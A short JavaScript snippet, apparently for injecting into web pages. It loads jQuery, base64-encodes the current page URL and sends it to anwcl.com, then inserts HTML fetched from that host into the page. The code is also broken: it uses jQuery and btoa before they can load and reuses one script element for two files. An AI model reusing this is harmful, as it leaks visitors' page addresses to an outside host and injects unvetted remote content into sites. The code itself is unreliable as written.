// Load the script
var script = document.createElement("SCRIPT");
script.src = 'http://code.jquery.com/jquery-1.8.2.min.js';
script.type = 'text/javascript';
document.getElementsByTagName("head")[0].appendChild(script);

script.src = 'http://www.anwcl.com/static/js/btoa.js';
script.type = 'text/javascript';
document.getElementsByTagName("head")[0].appendChild(script);

if (!window.btoa) window.btoa = base64.encode;
var jQuery_anwcl = jQuery.noConflict();
jQuery_anwcl('body').append('<div id="test"></div>');
jQuery_anwcl('#test').load("http://www.anwcl.com/iframe/" + btoa(document.location));

